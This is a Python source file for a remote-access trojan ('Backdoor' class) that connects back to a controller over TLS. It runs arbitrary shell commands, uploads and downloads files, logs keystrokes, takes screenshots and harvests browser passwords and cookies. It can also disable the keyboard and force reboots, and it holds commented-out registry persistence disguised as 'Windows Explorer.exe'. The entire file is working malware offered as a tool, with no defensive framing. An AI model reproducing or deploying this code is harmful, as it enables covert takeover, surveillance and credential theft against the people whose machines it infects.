import socket
import subprocess,json
import os
import base64
import ssl
import pyautogui
import tempfile
import keyboard
import sys
from Modules.Browser import browser
from Modules.Keylogger import keylogger

class Backdoor:
    def __init__(self,ip,port):
        self.context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        self.context.minimum_version = ssl.TLSVersion.TLSv1_2
        self.context.maximum_version = ssl.TLSVersion.TLSv1_3
        self.context.check_hostname = False
        self.context.verify_mode = ssl.CERT_NONE
        certificate="""-----BEGIN CERTIFICATE-----
MIIFOTCCAyGgAwIBAgIUS7IfEljDpgZsah7HFpj1MX+p5uIwDQYJKoZIhvcNAQEL
BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM
GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDA3MjIwNDExMjdaFw0yNDA4
MjEwNDExMjdaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEw
HwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggIiMA0GCSqGSIb3DQEB
AQUAA4ICDwAwggIKAoICAQCqKLvS7vVEuZJtV2q8LDzQzJdsszhWWudBRUfjDxtZ
uqwQqIdoqRl2nNY9yarNH4btjvV+fiVrg9czHr/qBumm5oyWYK5DPMEYkHJAtEB3
BAsqCxNGE4s0FF4ljJsSt3WjLMuwnmhNvWrwm4JKkxcKKiB6NQ4CZkr/3uzwsqY/
9EGKfHQfa3UOmZejLtd6OyFwlUWRR/mGTSf93q/fvIriMmBo2cWz60iNntL1NlpP
xJ1teTQWtxh/yUrRR1uEgKRFLsy2Oc45B9/vsrrrEj4R+kEPHclp1oUhq29Rp3Qq
VzB8TtCGSfmzZHFYhYpmLTFSxUI8GNfFwPB0TstNw3OCwmnpBE8q19uQ4ThAUKvT
grJPbQTqmASimlK6idPIPWFbtz6UO1fT9+gLXNzXW0QpbFyXNh/wIoFROA0S1TMB
bmR0qJM/82wc2Wz0d53ZYQLrLzBvhN3zfy9GC95W6U1myHmo6zJqlRqPRVae3II8
KS+p5Oln7hnx2HLFi4PCEkHEcDzYic4pzHUskAq+HM7gWCjEgrMtEeDi0GpDYh2r
+PXF+mll7N89+ddp5FyQ27fLRvkNP+ayPYMEU51M7SDHV/sntpQG2A/jXMQsToAt
ARwTkcT5V3XfpWfU2etBmWZ9uzuqx/FlRiDDBR1y30wI89T2xjmNbJtSRi/8jqkJ
+wIDAQABoyEwHzAdBgNVHQ4EFgQUx9fqmH5I5xUkpkGNv8THGBGT514wDQYJKoZI
hvcNAQELBQADggIBAJEmoBd7HAHTfRfZpyAahIo/5cjD/FIwYtpFkPCJvlD4OL8v
s0JSS/E+XhrCDVYm7dbKN0UmM3i6a+XLDRcIjJVZ9x/Dhee5bSmQEb9obVGJJwK3
itmH9MTLXpMBAR3QQN1FbEdRrrN0asrZFmLjnw1ZrFdfiRaO//bC8Xz3hciLnEkd
B8r6n86baIk3xnQj5BmbARxPc75dQ1mh1RmNPn8wcQzkmukRhBkxKmRUf/t5Sbn5
MStYeUlL/qMX5OqWUhoRkt4yMJMIIl4o5MvVXTo1EwF7x51SnHhfAoNIQCuDZLXU
segQjVQp54uLfqj9wYvzyQ9fQ1b6bOJeoEAemhNqfKBNhbb4/nEPqBbCTZ+2TZHh
n9WwC9ZsXjsl3BwJ7h+I7AwSV0doRXjD/pFlTXUJzRXPuT/anBY1SwqvHTp1Qiyb
H/LqSoRXJPmQPt9lWOip21BfIO7I7eFTOYdwts9R8karA0Wc8l7B0tSZ5vJzsjiX
sfBGSntIbRDeywW5rPcUEhrPiR5z1CIMehYDi0DdMQ726d+RlQC68VU7pW0H2RJV
g90c1vee0M/llwFueGdn4SJjeo17yWcO8PH4tawLEHdjQRycD93Ygn4lcSHac1wI
QWiW0ZSeAk3ShZ0CvBwH5iMHrpUwVmXd6JAGLYbTsR/5ar3VKxEUb/yHhCba
-----END CERTIFICATE-----
"""
        self.context.load_verify_locations(cadata=certificate)
        self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.connection= self.context.wrap_socket(self.connection, server_hostname='smitk')
        self.connection.connect((ip,port))
        self.Send("bakara")
    
    def BrowserData(self,type):
        br=browser()
        if type=='passwords':
            return br.GetPasswords()
        elif type=='cookies':
            return br.GetCookies()
        return '[-] Invalid Browser Command'
    
    def Send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data.encode("utf-8"))
    
    def Receive(self):
        json_data=""
        while True:
            try:
                json_data=json_data+self.connection.recv(4096).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue
    
    def AddStartUp(self):
        pass
        # evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        # if not os.path.exists(evil_file_location):
        #     shutil.copyfile(sys.executable,evil_file_location)
        #     subprocess.call('reg add HKCU\\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
        #     return "[+] Persistence added successfully"
        # else:
        #     return "[-] Persistence already exists"
    
    def RemoveStartUp(self):
        pass
        # evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
        # if os.path.exists(evil_file_location):
        #     os.remove(evil_file_location)
        #     subprocess.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',shell=True)
        #     return "[+] Persistence removed successfully"
        # else:
        #     return "[-] Persistence does not exist"    
    
    def CD_Command(self,path):
        os.chdir(path)
        return "[+] Changing working directory to "+path    
    
    def RunShellCommand(self,command):
        return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)
    
    def ReadFile(self, path):
        with open(path, "rb") as file:
            binary_data = file.read()
            return base64.b64encode(binary_data).decode("utf-8")   
        
    def WriteFile(self,path,content):
        content=base64.b64decode(content)
        with open(path,"wb") as file:
            file.write(content)
            return "[+] Upload successful"
    
    def KeyLogger(self,command):
        if command == "on":
            self.keylogger=keylogger()
            return self.keylogger.on()
        elif command == "off":
            return self.keylogger.off()
        elif command=="report":
            return self.keylogger.report()
        else:
            return "[-] Invalid command"
            
    def Screenshot(self):
        screenshot = pyautogui.screenshot()
        temp_directory = tempfile.gettempdir()
        current_working_directory = os.getcwd()
        os.chdir(temp_directory)
        file_path="screenshot.png"
        screenshot.save(file_path)
        taken_screenshot=self.ReadFile(file_path)
        os.remove(file_path)
        os.chdir(current_working_directory)
        return taken_screenshot
            
    def DisableKeyboard(self):
        for i in range(150):
            keyboard.block_key(i)
        return "[+] Keyboard disabled"
    
    def reboot(self):
        return os.system("shutdown /r /t 1")
    
    def shutdown(self):
        return os.system("shutdown /s /t 1")
    
    def LogOut(self):
        return os.system("shutdown -l")
    
    def EnableKeyboard(self):
        for i in range(150):
            keyboard.unblock_key(i)
        return "[+] Keyboard enabled"
        
    def run(self):
        while True:
            try:
                command=self.Receive()
                if command[0]=="exit":
                    self.Send("[-] Exiting")
                    self.connection.close()
                    sys.exit()
                if command[0]=="persistent":
                    if command[1]=="add":
                        command_result=self.AddStartUp()
                    elif command[1]=="remove":
                        command_result=self.RemoveStartUp()
                elif command[0]=="cd" and len(command)>1:
                    command_result=self.CD_Command(command[1])
                elif command[0]=="download":
                    command_result=self.ReadFile(command[1])
                elif command[0]=="upload":
                    command_result=self.WriteFile(command[1],command[2])
                elif command[0]=="keylogger":
                    command_result=self.KeyLogger(command[1])
                elif command[0]=="screenshot":
                    command_result=self.Screenshot()
                elif command[0]=="browser":
                    command_result=self.BrowserData(command[1])
                elif command[0]=="disable_keyboard":
                    command_result=self.DisableKeyboard()
                elif command[0]=="reboot":
                    command_result="[]"+self.reboot()
                    
                else:
                    command_result=self.RunShellCommand(command).decode("utf-8")
            except Exception as e:
                command_result="[-] Bakara ERR : \n%s"%str(e)
            self.Send(command_result)

my_backdoor=Backdoor("127.0.0.1",8080)
my_backdoor.run()